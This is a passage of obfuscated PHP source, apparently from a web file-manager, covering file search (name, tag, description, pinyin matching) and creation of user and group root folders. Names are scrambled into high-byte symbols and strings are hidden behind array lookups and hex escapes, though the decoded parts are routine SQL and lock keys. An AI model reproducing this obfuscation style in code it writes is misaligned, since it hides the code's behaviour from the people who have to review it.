listSearch($¨ø×Á, $›ßÎÑ´ = 300) { $Şµı•ûì =& $_SERVER[¤·²È‰º]; if (isset($¨ø×Á[$Şµı•ûì[1917]]) && $¨ø×Á[$Şµı•ûì[1917]]) { $¨ø×Á[$Şµı•ûì[1917]] = str_replace($Şµı•ûì[392], $Şµı•ûì[2075], trim($¨ø×Á[$Şµı•ûì[1917]])); } $î•çüäŒ = $this->_parseSearchWhere($¨ø×Á); if (!isset($î•çüäŒ[$Şµı•ûì[439]])) { $î•çüäŒ[$Şµı•ûì[439]] = 0; } $˜šŸêÑÇ = $Şµı•ûì[2076]; $ã¾¦ÌÎ» = $î•çüäŒ; $İíĞÕê° = $˜šŸêÑÇ; $this->_listSearchBindPinyin($¨ø×Á, $î•çüäŒ, $˜šŸêÑÇ); $this->alias($Şµı•ûì[454])->_makeOrder(); $î•çüäŒ = $this->parseWhereLike($î•çüäŒ); $‚Ú¹´¦À = $this->distinct(!0)->field($˜šŸêÑÇ)->where($î•çüäŒ)->selectPage($›ßÎÑ´); if ($GLOBALS[$Şµı•ûì[6]][$Şµı•ûì[389]][$Şµı•ûì[390]] && Input::check($¨ø×Á[$Şµı•ûì[1917]], $Şµı•ûì[601]) && $‚Ú¹´¦À[$Şµı•ûì[375]][$Şµı•ûì[362]] == 1 && $‚Ú¹´¦À[$Şµı•ûì[375]][$Şµı•ûì[376]] == 0) { $‚Ú¹´¦À = $this->distinct(!0)->field($˜šŸêÑÇ)->where($ã¾¦ÌÎ»)->limit(1000)->select(); $‚Ú¹´¦À = array_page_split($‚Ú¹´¦À, !1, $›ßÎÑ´); } $this->_listSearchFileContent($‚Ú¹´¦À, $¨ø×Á, $İíĞÕê°, $ã¾¦ÌÎ»); $this->_listSearchDesc($‚Ú¹´¦À, $¨ø×Á, $İíĞÕê°); $this->_listSearchTag($‚Ú¹´¦À, $¨ø×Á, $İíĞÕê°); $this->_listSearchGroupTag($‚Ú¹´¦À, $¨ø×Á, $İíĞÕê°); $this->_listDataApply($‚Ú¹´¦À[$Şµı•ûì[378]]); $this->_listMake($‚Ú¹´¦À); return $‚Ú¹´¦À; } private function _listSearchFileContent(&$ó…ÇóÙÙ, $†”õ¡ç§, $äŸï”Èœ, $ñçÔŞÆû) { $ÇÙ™¥© =& $_SERVER[¤·²È‰º]; if (!$†”õ¡ç§[$ÇÙ™¥©[1917]] || $ó…ÇóÙÙ[$ÇÙ™¥©[375]][$ÇÙ™¥©[362]] > 1) { return; } if (!isset($ñçÔŞÆû[$ÇÙ™¥©[42]]) || !is_array($†”õ¡ç§[$ÇÙ™¥©[476]])) { return; } $ñçÔŞÆû[$ÇÙ™¥©[476]] = array($ÇÙ™¥©[7], $†”õ¡ç§[$ÇÙ™¥©[476]]); unset($ñçÔŞÆû[$ÇÙ™¥©[42]]); unset($†”õ¡ç§[$ÇÙ™¥©[476]]); $Úä×«ë = $this->field($äŸï”Èœ)->where($ñçÔŞÆû)->limit($ÇÙ™¥©[2077])->select(); if (!$Úä×«ë || count($Úä×«ë) == 0) { return; } $ó…ÇóÙÙ[$ÇÙ™¥©[378]] = array_merge($Úä×«ë, $ó…ÇóÙÙ[$ÇÙ™¥©[378]]); $ó…ÇóÙÙ[$ÇÙ™¥©[375]][$ÇÙ™¥©[376]] += count($Úä×«ë); } private function _listSearchTag(&$±ù—ÙßË, $ÄÏÛ’û¾, $‡†–§³Ó) { $ãÃ“À =& $_SERVER[¤·²È‰º]; if (!$ÄÏÛ’û¾[$ãÃ“À[1917]] || $±ù—ÙßË[$ãÃ“À[375]][$ãÃ“À[362]] > 1) { return; } $È– ¸ö• = Model($ãÃ“À[2078])->listData(); $İæêşÉ = array(); $®ª—„ıØ = $ÄÏÛ’û¾[$ãÃ“À[1917]]; foreach ($È– ¸ö• as $ÚŞã³) { $Ö…ªšö¦ = $ÚŞã³[$ãÃ“À[42]]; $º½”Ìß = str_replace($ãÃ“À[63], $ãÃ“À[12], Pinyin::get($Ö…ªšö¦)); if (stripos($Ö…ªšö¦, $®ª—„ıØ) !== !1 || stripos($º½”Ìß, $®ª—„ıØ) !== !1) { $İæêşÉ[] = $ÚŞã³[$ãÃ“À[407]]; } } if (!$İæêşÉ) { return; } $Ê«ãÙÌ = array($ãÃ“À[434] => array($ãÃ“À[7], $İæêşÉ), $ãÃ“À[1651] => USER_ID); $Å€áïéı = Model($ãÃ“À[436])->field($ãÃ“À[94])->where($Ê«ãÙÌ)->select(); $Å€áïéı = array_to_keyvalue($Å€áïéı, $ãÃ“À[12], $ãÃ“À[94]); $ë¡„–íî = array_unique($Å€áïéı); $this->_listSearchMerge($±ù—ÙßË, $ÄÏÛ’û¾, $‡†–§³Ó, $ë¡„–íî); } private function _listSearchDesc(&$‘¡†…”˜, $°­¥ÍÇÎ, $¸¨òµğÒ) { $¦–˜èµ¦ =& $_SERVER[¤·²È‰º]; if (!$°­¥ÍÇÎ[$¦–˜èµ¦[1917]] || $‘¡†…”˜[$¦–˜èµ¦[375]][$¦–˜èµ¦[362]] > 1) { return; } $§ûÑú˜ = array($¦–˜èµ¦[104] => $¦–˜èµ¦[461], $¦–˜èµ¦[383] => array($¦–˜èµ¦[391], $¦–˜èµ¦[1919] . $°­¥ÍÇÎ[$¦–˜èµ¦[1917]] . $¦–˜èµ¦[1919])); $‹å½œ¨µ = !1; if ($‹å½œ¨µ) { $Î«Îõå¬ = $this->listSearchChildren($°­¥ÍÇÎ[$¦–˜èµ¦[440]]); $Î«Îõå¬ = array_unique($Î«Îõå¬); if (!$Î«Îõå¬) { return; } $§ûÑú˜[$¦–˜èµ¦[410]] = array($¦–˜èµ¦[7], $Î«Îõå¬); } $ï—Ú¼´ã = Model($¦–˜èµ¦[577])->field($¦–˜èµ¦[410])->where($§ûÑú˜)->limit(5000)->select(); $ŞÒ°®ÌŒ = array_to_keyvalue($ï—Ú¼´ã, $¦–˜èµ¦[12], $¦–˜èµ¦[410]); $this->_listSearchMerge($‘¡†…”˜, $°­¥ÍÇÎ, $¸¨òµğÒ, $ŞÒ°®ÌŒ); } private function _listSearchGroupTag(&$Ò§ü¤ã, $‚¾›ßÄ¹, $ê¹ßöšñ) { $¾Öò¶³ë =& $_SERVER[¤·²È‰º]; if (!$‚¾›ßÄ¹[$¾Öò¶³ë[1917]] || $Ò§ü¤ã[$¾Öò¶³ë[375]][$¾Öò¶³ë[362]] > 1 || !$‚¾›ßÄ¹[$¾Öò¶³ë[440]]) { return; } $ö†€¾ = $this->sourceInfo($‚¾›ßÄ¹[$¾Öò¶³ë[440]]); if (!$ö†€¾ || $ö†€¾[$¾Öò¶³ë[419]] != SourceModel::TYPE_GROUP) { return; } $§Ã¬¥ = $ö†€¾[$¾Öò¶³ë[513]]; $†ÓƒÏ¬¦ = Model($¾Öò¶³ë[2079])->get($§Ã¬¥); $Ô±Çõƒ¶ = array(); $”şÓƒÀ = $‚¾›ßÄ¹[$¾Öò¶³ë[1917]]; foreach ($†ÓƒÏ¬¦[$¾Öò¶³ë[378]] as $­ŸÔ÷ìÉ) { $Êš‚ı‘Ì = $­ŸÔ÷ìÉ[$¾Öò¶³ë[42]]; $Á¼²Í» = str_replace($¾Öò¶³ë[63], $¾Öò¶³ë[12], Pinyin::get($Êš‚ı‘Ì)); if (stripos($Êš‚ı‘Ì, $”şÓƒÀ) !== !1 || stripos($Á¼²Í», $”şÓƒÀ) !== !1) { $Ô±Çõƒ¶[] = $­ŸÔ÷ìÉ[$¾Öò¶³ë[407]]; } } if (!$Ô±Çõƒ¶) { return; } $©Ÿ†¿µ = array($¾Öò¶³ë[434] => array($¾Öò¶³ë[7], $Ô±Çõƒ¶), $¾Öò¶³ë[1651] => 0, $¾Öò¶³ë[43] => $¾Öò¶³ë[1939] . $§Ã¬¥); $ç‹Ëç²è = Model($¾Öò¶³ë[436])->field($¾Öò¶³ë[94])->where($©Ÿ†¿µ)->select(); $ç‹Ëç²è = array_to_keyvalue($ç‹Ëç²è, $¾Öò¶³ë[12], $¾Öò¶³ë[94]); $¤³‚å­“ = array_unique($ç‹Ëç²è); $this->_listSearchMerge($Ò§ü¤ã, $‚¾›ßÄ¹, $ê¹ßöšñ, $¤³‚å­“); } private function _listSearchMerge(&$â”ĞÖ€, $Ñ‚½¸¿Õ, $†¤Ó–ïÜ, $À„ŒŸ¨ß) { $Ôá €Ş© =& $_SERVER[¤·²È‰º]; if (!$À„ŒŸ¨ß) { return; } $“ê¡‚Ù¼ = array_to_keyvalue($â”ĞÖ€[$Ôá €Ş©[378]], $Ôá €Ş©[12], $Ôá €Ş©[410]); $Ûİ¸œœ³ = array_diff($À„ŒŸ¨ß, $“ê¡‚Ù¼); if (!$Ûİ¸œœ³) { return; } $ß¥€Å’ = array($Ôá €Ş©[410] => array($Ôá €Ş©[7], $Ûİ¸œœ³)); $ë¢¶¨ÙÒ = $this->field($†¤Ó–ïÜ)->where($ß¥€Å’)->select(); if (!$ë¢¶¨ÙÒ) { return; } $„Ûœ¶ûï = array(); foreach ($ë¢¶¨ÙÒ as $µ¬ë–åÂ) { if ($this->_listSearchFilter($µ¬ë–åÂ, $Ñ‚½¸¿Õ)) { $„Ûœ¶ûï[] = $µ¬ë–åÂ; } } $â”ĞÖ€[$Ôá €Ş©[378]] = array_merge($„Ûœ¶ûï, $â”ĞÖ€[$Ôá €Ş©[378]]); $â”ĞÖ€[$Ôá €Ş©[375]][$Ôá €Ş©[376]] += count($„Ûœ¶ûï); } private function _listSearchFilter($‹ß¸ø½İ, $«Ó÷‡) { $ã‚ùÔÖ½ =& $_SERVER[¤·²È‰º]; $ “–é¾ = $‹ß¸ø½İ[$ã‚ùÔÖ½[418]] == $ã‚ùÔÖ½[98]; if (!strstr($‹ß¸ø½İ[$ã‚ùÔÖ½[529]], $ã‚ùÔÖ½[60] . $«Ó÷‡[$ã‚ùÔÖ½[440]] . $ã‚ùÔÖ½[60])) { return !1; } if (isset($«Ó÷‡[$ã‚ùÔÖ½[420]]) && $«Ó÷‡[$ã‚ùÔÖ½[420]] != $ã‚ùÔÖ½[1878]) { if ($«Ó÷‡[$ã‚ùÔÖ½[420]] == $ã‚ùÔÖ½[85] && !$ “–é¾) { return !1; } if ($«Ó÷‡[$ã‚ùÔÖ½[420]] != $ã‚ùÔÖ½[85] && $ “–é¾) { return !1; } if (!strstr($‹ß¸ø½İ[$ã‚ùÔÖ½[184]], $ã‚ùÔÖ½[60] . $«Ó÷‡[$ã‚ùÔÖ½[420]] . $ã‚ùÔÖ½[60])) { return !1; } } if (isset($«Ó÷‡[$ã‚ùÔÖ½[2080]]) && $«Ó÷‡[$ã‚ùÔÖ½[2080]] < $‹ß¸ø½İ[$ã‚ùÔÖ½[86]]) { return !1; } if (isset($«Ó÷‡[$ã‚ùÔÖ½[2081]]) && $«Ó÷‡[$ã‚ùÔÖ½[2081]] > $‹ß¸ø½İ[$ã‚ùÔÖ½[86]]) { return !1; } if (isset($«Ó÷‡[$ã‚ùÔÖ½[608]]) && $«Ó÷‡[$ã‚ùÔÖ½[608]] != $‹ß¸ø½İ[$ã‚ùÔÖ½[464]]) { return !1; } return !0; } public function listSearchChildren($ËÒßšÍæ, $ÇÜ¾µ¡Ÿ = 5000) { $ÛæíóœÒ =& $_SERVER[¤·²È‰º]; $‚®Ğì‰õ = array(); $‰—¡˜« = $this->sourceInfo($ËÒßšÍæ); $´ ş¯¤­ = array($ÛæíóœÒ[529] => array($ÛæíóœÒ[391], $‰—¡˜«[$ÛæíóœÒ[529]] . $‰—¡˜«[$ÛæíóœÒ[410]] . $ÛæíóœÒ[559])); $ÏåãçÊ = $this->field($ÛæíóœÒ[86])->where($´ ş¯¤­)->limit($ÇÜ¾µ¡Ÿ + 1)->select(); $Ñ °äë = is_array($ÏåãçÊ) ? count($ÏåãçÊ) : 0; if ($Ñ °äë > $ÇÜ¾µ¡Ÿ) { return $this->_listSearchChildrenNear($ËÒßšÍæ, $ÇÜ¾µ¡Ÿ); } $İ°Ã®é” = $this->field($ÛæíóœÒ[410])->where($´ ş¯¤­)->select(); $‚®Ğì‰õ = array_to_keyvalue($İ°Ã®é”, $ÛæíóœÒ[12], $ÛæíóœÒ[410]); return $‚®Ğì‰õ; } private function _listSearchChildrenNear($ïü®µ„†, $™ô­Ââú) { $€¿‡‹Ì =& $_SERVER[¤·²È‰º]; $º¨ÛÖˆ = array(); $ÖÎ±‰Ü = array($€¿‡‹Ì[440] => $ïü®µ„†); $’êïéóú = $this->field($€¿‡‹Ì[2082])->where($ÖÎ±‰Ü)->select(); $¹ƒÃô› = array_to_keyvalue(array_filter_by_field($’êïéóú, $€¿‡‹Ì[418], $€¿‡‹Ì[98]), $€¿‡‹Ì[12], $€¿‡‹Ì[410]); $º¨ÛÖˆ = array_merge($º¨ÛÖˆ, array_to_keyvalue($’êïéóú, $€¿‡‹Ì[12], $€¿‡‹Ì[410])); if (!$¹ƒÃô›) { return $º¨ÛÖˆ; } $ÖÎ±‰Ü = array($€¿‡‹Ì[440] => array($€¿‡‹Ì[7], $¹ƒÃô›)); $’êïéóú = $this->field($€¿‡‹Ì[2082])->where($ÖÎ±‰Ü)->limit($™ô­Ââú)->select(); $º¨ÛÖˆ = array_merge($º¨ÛÖˆ, array_to_keyvalue($’êïéóú, $€¿‡‹Ì[12], $€¿‡‹Ì[410])); $º¨ÛÖˆ = array_slice($º¨ÛÖˆ, 0, $™ô­Ââú); return $º¨ÛÖˆ; } private function _listSearchBindPinyin($ºªà°±, &$±¤Ù›’ò, &$çğü‹µÇ) { $¼¤–‰¤ª =& $_SERVER[¤·²È‰º]; if (!isset($ºªà°±[$¼¤–‰¤ª[1917]]) || !$ºªà°±[$¼¤–‰¤ª[1917]]) { return; } if (!Input::check($ºªà°±[$¼¤–‰¤ª[1917]], $¼¤–‰¤ª[327]) || strlen($ºªà°±[$¼¤–‰¤ª[1917]]) < 2) { return; } $×´à²ğĞ = "\114\105\x46\x54\40\x4a\117\111\x4e\40{$this->tablePrefix}\x69\x6f\x5f\x73\157\165\162\143\x65\x5f\155\x65\164\141\x20\x6d\145\164\x61\40\x6f\156\x20\x73\x6f\165\x72\143\145\x2e\163\157\x75\x72\143\145\x49\x44\40\75\40\x6d\145\164\141\x2e\x73\157\165\x72\143\x65\111\x44"; $Œ¨º©Û = array(); $çğü‹µÇ = str_replace(array($¼¤–‰¤ª[18], $¼¤–‰¤ª[63], $¼¤–‰¤ª[2083]), $¼¤–‰¤ª[12], $çğü‹µÇ); $çğü‹µÇ = $¼¤–‰¤ª[446] . str_replace($¼¤–‰¤ª[60], $¼¤–‰¤ª[447], $çğü‹µÇ); $‚Êç²‰¡ = $±¤Ù›’ò[$¼¤–‰¤ª[42]]; unset($±¤Ù›’ò[$¼¤–‰¤ª[42]]); foreach ($±¤Ù›’ò as $©ˆÇ„¸¨ => $¼êŞ”¥) { $Œ¨º©Û[$¼¤–‰¤ª[446] . $©ˆÇ„¸¨] = $¼êŞ”¥; } foreach ($‚Êç²‰¡ as $´‹ÖŞ) { $Œ¨º©Û[] = array($¼¤–‰¤ª[451] => $´‹ÖŞ, $¼¤–‰¤ª[994] => $¼¤–‰¤ª[1921], array($¼¤–‰¤ª[2084] => $´‹ÖŞ, $¼¤–‰¤ª[2085] => array($¼¤–‰¤ª[7], array($¼¤–‰¤ª[473], $¼¤–‰¤ª[472])))); } $this->join($×´à²ğĞ); $±¤Ù›’ò = $Œ¨º©Û; } private function _parseSearchWhere($ı‰ˆºÖÌ) { $ûš¼ÀÉú =& $_SERVER[¤·²È‰º]; $Šğ¿¹ÚÄ = array(); if (isset($ı‰ˆºÖÌ[$ûš¼ÀÉú[762]]) && $ı‰ˆºÖÌ[$ûš¼ÀÉú[762]]) { $Šğ¿¹ÚÄ[$ûš¼ÀÉú[95]] = array($ûš¼ÀÉú[2086], $ı‰ˆºÖÌ[$ûš¼ÀÉú[762]]); } if (isset($ı‰ˆºÖÌ[$ûš¼ÀÉú[505]]) && $ı‰ˆºÖÌ[$ûš¼ÀÉú[505]]) { $ÂÑ„¾¶Œ = array($ûš¼ÀÉú[2087], $ı‰ˆºÖÌ[$ûš¼ÀÉú[505]]); if ($Šğ¿¹ÚÄ[$ûš¼ÀÉú[95]]) { $Šğ¿¹ÚÄ[$ûš¼ÀÉú[95]] = array($Šğ¿¹ÚÄ[$ûš¼ÀÉú[95]], $ÂÑ„¾¶Œ, $ûš¼ÀÉú[2088]); } else { $Šğ¿¹ÚÄ[$ûš¼ÀÉú[95]] = $ÂÑ„¾¶Œ; } } if (isset($ı‰ˆºÖÌ[$ûš¼ÀÉú[2080]]) && $ı‰ˆºÖÌ[$ûš¼ÀÉú[2080]] > 0) { $Šğ¿¹ÚÄ[$ûš¼ÀÉú[86]] = array($ûš¼ÀÉú[2086], $ı‰ˆºÖÌ[$ûš¼ÀÉú[2080]]); } if (isset($ı‰ˆºÖÌ[$ûš¼ÀÉú[2081]]) && $ı‰ˆºÖÌ[$ûš¼ÀÉú[2081]]) { $ÂÑ„¾¶Œ = array($ûš¼ÀÉú[2087], $ı‰ˆºÖÌ[$ûš¼ÀÉú[2081]]); if ($Šğ¿¹ÚÄ[$ûš¼ÀÉú[86]]) { $Šğ¿¹ÚÄ[$ûš¼ÀÉú[86]] = array($Šğ¿¹ÚÄ[$ûš¼ÀÉú[86]], $ÂÑ„¾¶Œ, $ûš¼ÀÉú[2088]); } else { $Šğ¿¹ÚÄ[$ûš¼ÀÉú[86]] = $ÂÑ„¾¶Œ; } } if (isset($ı‰ˆºÖÌ[$ûš¼ÀÉú[608]]) && $ı‰ˆºÖÌ[$ûš¼ÀÉú[608]]) { $Šğ¿¹ÚÄ[] = array($ûš¼ÀÉú[464] => $ı‰ˆºÖÌ[$ûš¼ÀÉú[608]], $ûš¼ÀÉú[462] => $ı‰ˆºÖÌ[$ûš¼ÀÉú[608]], $ûš¼ÀÉú[994] => $ûš¼ÀÉú[1921]); } if (isset($ı‰ˆºÖÌ[$ûš¼ÀÉú[420]]) && $ı‰ˆºÖÌ[$ûš¼ÀÉú[420]]) { $”¦¥±é = $ı‰ˆºÖÌ[$ûš¼ÀÉú[420]]; if ($”¦¥±é == $ûš¼ÀÉú[85]) { $Šğ¿¹ÚÄ[$ûš¼ÀÉú[418]] = 1; } else { if ($”¦¥±é == $ûš¼ÀÉú[2089]) { $Šğ¿¹ÚÄ[$ûš¼ÀÉú[418]] = 0; } else { if ($”¦¥±é) { $”¦¥±é = is_array($”¦¥±é) ? $”¦¥±é : explode($ûš¼ÀÉú[60], $”¦¥±é); $Šğ¿¹ÚÄ[$ûš¼ÀÉú[420]] = array($ûš¼ÀÉú[426], $”¦¥±é); $Šğ¿¹ÚÄ[$ûš¼ÀÉú[418]] = 0; } } } } $this->_parseSearchParent($ı‰ˆºÖÌ, $Šğ¿¹ÚÄ); if (isset($ı‰ˆºÖÌ[$ûš¼ÀÉú[1917]]) && trim($ı‰ˆºÖÌ[$ûš¼ÀÉú[1917]])) { $¸óöêë = trim($ı‰ˆºÖÌ[$ûš¼ÀÉú[1917]]); $¬šÄ®’í = explode($ûš¼ÀÉú[63], $¸óöêë); if (strlen($¸óöêë) > 2 && (substr($¸óöêë, 0, 1) == $ûš¼ÀÉú[128] && substr($¸óöêë, -1) == $ûš¼ÀÉú[128]) || substr($¸óöêë, 0, 1) == $ûš¼ÀÉú[68] && substr($¸óöêë, -1) == $ûš¼ÀÉú[68]) { $¸óöêë = substr($¸óöêë, 1, -1); $¬šÄ®’í = array($¸óöêë); } $Šğ¿¹ÚÄ[$ûš¼ÀÉú[42]] = array(array($ûš¼ÀÉú[558], $ûš¼ÀÉú[1919] . $¸óöêë . $ûš¼ÀÉú[1919])); if (count($¬šÄ®’í) > 1) { $Šğ¿¹ÚÄ[$ûš¼ÀÉú[42]] = array(); foreach ($¬šÄ®’í as $½¶È‹­õ) { if (!trim($½¶È‹­õ)) { continue; } $Šğ¿¹ÚÄ[$ûš¼ÀÉú[42]][] = array($ûš¼ÀÉú[558], $ûš¼ÀÉú[1919] . trim($½¶È‹­õ) . $ûš¼ÀÉú[1919]); } } } return $Šğ¿¹ÚÄ; } private function _parseSearchParent($„Ìã·–, &$àãû¼) { $´¯ç¬¬¬ =& $_SERVER[¤·²È‰º]; if (!isset($„Ìã·–[$´¯ç¬¬¬[440]]) || !$„Ìã·–[$´¯ç¬¬¬[440]]) { return; } $Æşïï = $this->pathInfo($„Ìã·–[$´¯ç¬¬¬[440]]); $Ì…ôïş = $Æşïï[$´¯ç¬¬¬[440]] . $´¯ç¬¬¬[12] === $´¯ç¬¬¬[207]; $œÎƒ‘¦¼ = $Æşïï[$´¯ç¬¬¬[419]] == $´¯ç¬¬¬[523]; if ($Æşïï[$´¯ç¬¬¬[540]] == $´¯ç¬¬¬[541]) { $‘Íñ˜óï = $this->sourceInfo($„Ìã·–[$´¯ç¬¬¬[440]]); $Æşïï[$´¯ç¬¬¬[529]] = $‘Íñ˜óï[$´¯ç¬¬¬[529]]; } $àãû¼[$´¯ç¬¬¬[598]] = array($´¯ç¬¬¬[558], $Æşïï[$´¯ç¬¬¬[529]] . $„Ìã·–[$´¯ç¬¬¬[440]] . $´¯ç¬¬¬[559]); $¶ÈÎ„Ô¨ = isset($„Ìã·–[$´¯ç¬¬¬[1782]]) && in_array($´¯ç¬¬¬[523], $„Ìã·–[$´¯ç¬¬¬[1782]]); if (!$¶ÈÎ„Ô¨ || !$œÎƒ‘¦¼ || !$Ì…ôïş || !$Æşïï[$´¯ç¬¬¬[421]]) { return; } if (!AuthModel::authCheckRoot($Æşïï[$´¯ç¬¬¬[421]][$´¯ç¬¬¬[422]])) { return; } $ë•Ì = $Æşïï[$´¯ç¬¬¬[513]] . $´¯ç¬¬¬[12]; if ($ë•Ì == $´¯ç¬¬¬[98]) { unset($àãû¼[$´¯ç¬¬¬[598]]); $àãû¼[$´¯ç¬¬¬[419]] = self::TYPE_GROUP; return; } $ŒŸæĞïÑ = Model($´¯ç¬¬¬[530])->groupChildrenAll($ë•Ì); $ó…­½Ğ = count($ŒŸæĞïÑ); if ($ó…­½Ğ <= 1) { return; } $Éá­õ´ˆ = array($´¯ç¬¬¬[440] => 0, $´¯ç¬¬¬[419] => self::TYPE_GROUP, $´¯ç¬¬¬[513] => array($´¯ç¬¬¬[7], $ŒŸæĞïÑ)); $¹ìÊ‡ËÚ = $this->field($´¯ç¬¬¬[2090])->where($Éá­õ´ˆ)->limit($ó…­½Ğ)->select(); $àãû¼[$´¯ç¬¬¬[598]] = array(); foreach ($¹ìÊ‡ËÚ as $é¦–¢ÄÉ) { $àãû¼[$´¯ç¬¬¬[598]][] = array($´¯ç¬¬¬[558], $´¯ç¬¬¬[539] . $é¦–¢ÄÉ[$´¯ç¬¬¬[410]] . $´¯ç¬¬¬[559]); } $àãû¼[$´¯ç¬¬¬[598]][] = $´¯ç¬¬¬[1921]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ÒÀÇİŒÒ) { $›ñÎ±ØÆ =& $_SERVER[¤·²È‰º]; $ÉÎ¦Îºş = Model($›ñÎ±ØÆ[521])->where(array($›ñÎ±ØÆ[1642] => $ÒÀÇİŒÒ))->find(); $´ß‰¡ù† = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÒÀÇİŒÒ, $ÉÎ¦Îºş[$›ñÎ±ØÆ[42]]); $this->userDesktopAdd($´ß‰¡ù†); return $´ß‰¡ù†; } public function userDesktopAdd($·óÒ’²) { $¹’†ù°é =& $_SERVER[¤·²È‰º]; $­ÔŸ¾ˆ¼ = LNG($¹’†ù°é[2091]); $ï¡¯ü’ = $this->mkdir($·óÒ’², $­ÔŸ¾ˆ¼); $this->metaSet($ï¡¯ü’, $¹’†ù°é[2092], $¹’†ù°é[98]); $this->metaSet($·óÒ’², $¹’†ù°é[2093], $ï¡¯ü’); } public function userPathSafeAdd($å®íÕ¥) { $À´´Ô¾Œ =& $_SERVER[¤·²È‰º]; $ÖüâÊ’™ = Model($À´´Ô¾Œ[521])->getInfoFull($å®íÕ¥); if (!$ÖüâÊ’™) { return !1; } if (_get($ÖüâÊ’™, $À´´Ô¾Œ[544])) { return $ÖüâÊ’™[$À´´Ô¾Œ[474]][$À´´Ô¾Œ[2094]]; } $¬‰°ÑŒÃ = $this->_mkdirRoot(SourceModel::TYPE_USER, $å®íÕ¥, $À´´Ô¾Œ[2095], $À´´Ô¾Œ[441]); Model($À´´Ô¾Œ[521])->metaSet($å®íÕ¥, $À´´Ô¾Œ[2094], $¬‰°ÑŒÃ); $this->metaSet($¬‰°ÑŒÃ, $À´´Ô¾Œ[2096], $å®íÕ¥); return $¬‰°ÑŒÃ; } public function groupRootAdd($ ÓÛí³) { $³¨ééŒ˜ =& $_SERVER[¤·²È‰º]; $õ¾ı¸´ü = Model($³¨ééŒ˜[530])->where(array($³¨ééŒ˜[1911] => $ ÓÛí³))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ ÓÛí³, $õ¾ı¸´ü[$³¨ééŒ˜[42]]); } public function systemRootPathAdd($›·óÜŸ±) { if ($›·óÜŸ± != $_SERVER[¤·²È‰º][552]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $›·óÜŸ±); } public function userRootRemove($—Àƒğßá) { $‹¨Õ“Õ = $this->sourceRoot(SourceModel::TYPE_USER, $—Àƒğßá, !0); foreach ($‹¨Õ“Õ as $¤»Ûˆ) { if (!$¤»Ûˆ) { continue; } $this->remove($¤»Ûˆ[$_SERVER[¤·²È‰º][410]], !1); } } public function groupRootRemove($Œ‹ı¯••) { $ö½›•€Ç = $this->sourceRoot(SourceModel::TYPE_GROUP, $Œ‹ı¯••); if (!$ö½›•€Ç) { return; } $this->remove($ö½›•€Ç[$_SERVER[¤·²È‰º][410]], !1); } private function _mkdirRoot($ÅßÜ¹–¦, $ÌêŞÉ›, $û´•¿Ô·, $Õ µ‰­ = '') { $°ãöº =& $_SERVER[¤·²È‰º]; $­‡İ“¿… = array($°ãöº[409] => 0, $°ãöº[594] => $ÅßÜ¹–¦, $°ãöº[595] => $ÌêŞÉ›, $°ãöº[591] => 1, $°ãöº[596] => USER_ID, $°ãöº[597] => USER_ID, $°ãöº[592] => $Õ µ‰­, $°ãöº[598] => $°ãöº[539], $°ãöº[438] => 0, $°ãöº[593] => 0, $°ãöº[477] => 0, $°ãöº[599] => $°ãöº[12]); if ($Ó‘´£ÛŒ = $this->where($­‡İ“¿…)->find()) { return $Ó‘´£ÛŒ[$°ãöº[410]]; } $â½óœ¤˜ = "\115\157\x64\x65\x6c\x53\157\x75\162\x63\x65\56\155\x6b\144\x69\x72\x52\157\157\x74\x2e{$ÅßÜ¹–¦}\x2e{$ÌêŞÉ›}\56" . $û´•¿Ô·; CacheLock::lock($â½óœ¤˜); $­‡İ“¿…[$°ãöº[42]] = $û´•¿Ô·; $€µŸÏ™Ï = $this->add($­‡İ“¿…); $Ïö•ÏÙ£ = array($°ãöº[600] => short_id($€µŸÏ™Ï)); $this->where(array($°ãöº[425] => $€µŸÏ™Ï))->save($Ïö•ÏÙ£); CacheLock::unlock($â½óœ¤˜); return $€µŸÏ™Ï; } private function sourceRoot($â‰©Ê»é, $‹´ŒşíÀ, $å€Âã· = false) { $£¹˜À‚ =& $_SERVER[¤·²È‰º]; $¾àíæŸ­ = array($£¹˜À‚[409] => 0, $£¹˜À‚[594] => $â‰©Ê»é, $£¹˜À‚[595] => $‹´ŒşíÀ); if ($å€Âã·) { $ëÑâÂ½ = $this->where($¾àíæŸ­)->select(); return $ëÑâÂ½ ? $ëÑâÂ½ : array(); } $ô¤Ÿë‘Æ = $this->where($¾àíæŸ­)->find(); return $ô¤Ÿë‘Æ ? $ô¤Ÿë‘Æ : array(); } public function sourceRootGroup($µÖèÙ‚) { $õßíôº¬ =& $_SERVER[¤·²È‰º]; if (is_string($µÖèÙ‚)) { $µÖèÙ‚ = array($µÖèÙ‚); } $’ÔƒĞã— = $this->listSourceRoot(SourceModel::TYPE_GROUP, $µÖèÙ‚, $õßíôº¬[198]); $äá÷ª°õ = array($õßíôº¬[378] => $’ÔƒĞã—, $õßíôº¬[375] => array($õßíôº¬[760] => count($µÖèÙ‚))); $this->_listDataApply($äá÷ª°õ[$õßíôº¬[378]]); $this->_listMake($äá÷ª°õ); return array_to_keyvalue($äá÷ª°õ[$õßíôº¬[92]], $õßíôº¬[513]); } public function mkfile($îàşÊñõ, $Ş¾É†ÙÙ, $ª‰¼ô†Ã = '', $½Ùû³è = REPEAT_RENAME) { $ÕØ£óá¯ =& $_SERVER[¤·²È‰º]; $½ã£ŒÂû = Model($ÕØ£óá¯[617])->addFileByContent($ª‰¼ô†Ã, $Ş¾É†ÙÙ); return $this->_createFileCall($îàşÊñõ, $Ş¾É†ÙÙ, $½ã£ŒÂû, $½Ùû³è, $ÕØ£óá¯[1332]); } public function addFile($¸óĞœıû, $Ï¤¤²ì, $ÈÚ·Øßğ, $Â‡š­‹ = false, $Ï¨±¹ = REPEAT_RENAME) { $Áøû …¸ = Model($_SERVER[¤·²È‰º][617])->addFile($Ï¤¤²ì, $ÈÚ·Øßğ, $Â‡š­‹); return $this->_createFileCall($¸óĞœıû, $ÈÚ·Øßğ, $Áøû …¸, $Ï¨±¹); } public function addFileByFileID($Å¡Ñ§É, $Æ¹Šò¡Õ, $Å»åÖû, $ìŸœÃïˆ = REPEAT_RENAME) { $Ø­•Šâ =& $_SERVER[¤·²È‰º]; $Š¢£€… = Model($Ø­•Šâ[617])->find($Æ¹Šò¡Õ); Model($Ø­•Šâ[617])->linkAdd($Æ¹Šò¡Õ); return $this->_createFileCall($Å¡Ñ§É, $Å»åÖû, $Š¢£€…, $ìŸœÃïˆ); } public function 